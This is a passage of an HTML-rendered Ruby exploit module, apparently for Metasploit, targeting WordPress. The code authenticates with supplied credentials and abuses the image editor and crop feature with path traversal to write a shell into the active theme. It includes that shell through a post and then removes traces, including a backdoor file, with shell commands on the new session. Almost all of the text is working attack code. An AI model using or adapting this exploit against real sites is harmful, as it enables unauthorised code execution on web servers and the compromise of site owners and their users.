class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;action&#39; =&gt; &quot;delete-post&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;id&#39; &nbsp;&nbsp;&nbsp;&nbsp;=&gt; infos[i],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;_wpnonce&#39; =&gt; infos[i+1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;uri1 = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;edit.php&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;GET&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri1,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; &nbsp;&nbsp;&nbsp;=&gt; cookie</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_nonce = res.body.scan(/post=#{post_id}&amp;action=trash&amp;_wpnonce=(\w+)/).flatten.first</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &#39;Unable to retrieve post nonce&#39;) unless post_nonce</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uri2 = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;post.php&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res = send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;GET&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri2,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; &nbsp;&nbsp;&nbsp;=&gt; cookie,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;vars_get&#39; &nbsp;=&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;post&#39; &nbsp;&nbsp;&nbsp;&nbsp;=&gt; post_id,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;action&#39; &nbsp;&nbsp;=&gt; &#39;trash&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;_wpnonce&#39; =&gt; post_nonce</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &#39;Unable to retrieve response&#39;) unless res &amp;&amp; res.code == 302</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res = send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;GET&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri1,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; &nbsp;&nbsp;&nbsp;=&gt; cookie,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;vars_get&#39; &nbsp;=&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;post_status&#39; =&gt; &quot;trash&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;post_type&#39; &nbsp;&nbsp;=&gt; &#39;post&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;_wpnonce&#39; =&gt; post_nonce</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nonce = res.body.scan(/post=#{post_id}&amp;action=delete&amp;_wpnonce=(\w+)/).flatten.first</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &#39;Unable to retrieve nonce&#39;) unless nonce</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;GET&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri2,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; &nbsp;&nbsp;&nbsp;=&gt; cookie,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;vars_get&#39; &nbsp;=&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;post&#39; &nbsp;&nbsp;&nbsp;&nbsp;=&gt; post_id,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;action&#39; &nbsp;&nbsp;=&gt; &#39;delete&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;_wpnonce&#39; =&gt; nonce</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;end</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def exploit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &#39;The target does not appear to be using WordPress&#39;) unless wordpress_and_online?</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print_status(&quot;Authenticating with WordPress using #{username}:#{password}...&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cookie = wordpress_login(username, password)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fail_with(Failure::NoAccess, &#39;Failed to authenticate with WordPress&#39;) if cookie.nil?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print_good(&quot;Authenticated with WordPress&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;store_valid_credential(user: username, private: password, proof: cookie)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print_status(&quot;Preparing payload...&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@current_theme = get_current_theme</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;wp_nonce = get_wpnonce(cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@current_date = Time.now.strftime(&quot;%Y/%m/&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;img_name = Rex::Text.rand_text_alpha(10)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@filename1, image_id, update_nonce = upload_file(img_name, wp_nonce, cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ajax_nonce = get_ajaxnonce(cookie)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@filename1 = image_editor(img_name, ajax_nonce, image_id, cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;wpnonce2 = get_wpnonce2(image_id, cookie)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;change_path(wpnonce2, image_id, @filename1, @current_date, &#39;?/x&#39;, cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;crop_image(image_id, ajax_nonce, cookie)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@shell_name = Rex::Text.rand_text_alpha(10)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;change_path(wpnonce2, image_id, @filename1, @current_date, &quot;?/../../../../themes/#{@current_theme}/#{@shell_name}&quot;, cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;crop_image(image_id, ajax_nonce, cookie)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print_status(&quot;Including into theme&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_id = include_theme(@shell_name, cookie)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;check_for_base64(cookie, post_id)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;wp_cleanup(@shell_name, post_id, cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def on_new_session(client)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;client.shell_command_token(&quot;rm wp-content/uploads/#{@current_date}#{@filename1[0...10]}*&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;client.shell_command_token(&quot;rm wp-content/uploads/#{@current_date}cropped-#{@filename1[0...10]}*&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;client.shell_command_token(&quot;rm -r wp-content/uploads/#{@current_date}#{@filename1[0...10]}*&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;client.shell_command_token(&quot;rm wp-content/themes/#{@current_theme}/cropped-#{@shell_name}.jpg&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;client.shell_command_token(&quot;rm #{@backdoor}.php&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">en</span></p></body>
</html>
